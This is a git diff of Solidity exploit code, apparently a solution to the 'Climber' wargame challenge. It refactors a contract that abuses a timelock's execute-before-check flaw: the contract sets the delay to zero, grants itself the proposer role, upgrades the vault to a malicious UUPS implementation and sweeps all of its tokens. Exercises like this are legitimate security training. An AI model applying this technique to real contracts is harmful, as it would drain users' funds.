@@ -130,8 +130,8 @@ contract MaliciousImplementation is UUPSUpgradeable {
     // we have to define this fn because in UUPSUpgradeable this fn is virtual and abstract
     function _authorizeUpgrade(address newImplementation) internal override {}
 
-    // we just need to match the fn name and storage slot structure
-    // only define sweepFunds because we can use it to send all the tokens held by proxy to us
+    //we declare a fn with same signature of fn the og implementation
+    // we use it to transfer all funds proxy holds to us
     function sweepFunds(address token) external {
         SafeTransferLib.safeTransfer(
             token,
@@ -141,10 +141,10 @@ contract MaliciousImplementation is UUPSUpgradeable {
     }
 }
 contract ExploitTimelockExecute {
-    ClimberVault vault;
-    ClimberTimelock timelock;
+    ClimberVault immutable vault;
+    ClimberTimelock immutable timelock;
+    address immutable newVault;
 
-    address newVault;
     address[] targets = new address[](4);
     //will already have their value 0 by default which is what we want it to be so no need to initialize later
     uint256[] values = new uint256[](4);
@@ -161,7 +161,7 @@ contract ExploitTimelockExecute {
         newVault = _newVault;
     }
 
-    function executeAttack() public {
+    function executeAttack() external {
         targets[0] = address(vault);
         targets[1] = address(timelock);
         targets[2] = address(timelock);
@@ -172,8 +172,11 @@ contract ExploitTimelockExecute {
             UUPSUpgradeable.upgradeToAndCall,
             (newVault, "")
         );
-        //make the delay 0 so that execute happens instantly without an delay related evert happening
+        // Set the delay to zero so the operation can become ready
+        // before execute() performs its final readiness check.
         dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+        // The helper must be a proposer because it calls schedule()
+        // from maliciousScheduling().
         //We grant this current exploiter contract proposer role so that it can schedule our batch for execution
         dataElements[2] = abi.encodeCall(
             AccessControl.grantRole,
@@ -181,9 +184,11 @@ contract ExploitTimelockExecute {
         );
         /*
 
-        we make use of the lack of cei in the timelock execute implementation to schedule our execute after doing it
-        we call a separate fn which runs timelock.schedule(targets, values, dataElements, salt) inside
-        we don't call it directly because then there will be cyclical recursive relation between execute and schedule making it impossible to schedule our batch
+        we make use of the timelock contract not following the cei pattern i.e execution happening before validating if the action is scheduled in the timelock Execute implementation 
+        we encode call of a separate fn maliciousScheduling which runs timelock.schedule(targets, values, dataElements, salt) inside
+        we do not encode timelock.schedule itslef because then we will have to pass datalements direclty in schedule and then also in execute 
+        which in turn makes it impossible for execute to pass same op id schedule passed bcos execute won't be able to pass the same dataelements
+        as schedule ever
 
        */
         dataElements[3] = abi.encodeCall(this.maliciousScheduling, ());
